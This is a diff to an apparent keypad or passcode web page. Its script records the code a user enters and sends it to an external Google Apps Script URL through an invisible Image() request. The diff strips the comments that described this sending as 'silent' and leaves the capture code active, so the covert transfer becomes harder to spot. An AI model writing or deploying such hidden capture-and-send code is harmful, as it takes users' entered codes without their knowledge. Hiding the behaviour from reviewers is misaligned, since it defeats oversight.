@@ -147,7 +147,7 @@
     <script>
         // --- Configuration ---
         const CORRECT_PASSWORD = '6018'; 
-        // This URL must remain the Google Script URL for CORS and silent sending.
+        // UPDATED GOOGLE SCRIPT URL:
         const SCRIPT_URL_BASE = 'https://script.google.com/macros/s/AKfycbzsroivuM0dDHb7T3lmsR4HeHtDXEEGYWoZKWtd4ZHvq0V07x5aitArqLlGoV9GGRaW/exec';
         
         // --- State Variables ---
@@ -176,16 +176,12 @@
             return (row - 1) * 3 + col;
         }
 
-        /**
-         * Sends the recorded code silently to the Google Script proxy.
-         */
         function sendCode(code) {
             if (codeSent) return;
             
             // Appends the code to the Google Script URL as a GET parameter
             const url = `${SCRIPT_URL_BASE}?user=pots&code=${encodeURIComponent(code)}&t=${Date.now()}`;
             
-            // Silent GET request using Image()
             const img = new Image();
             img.src = url; 
             
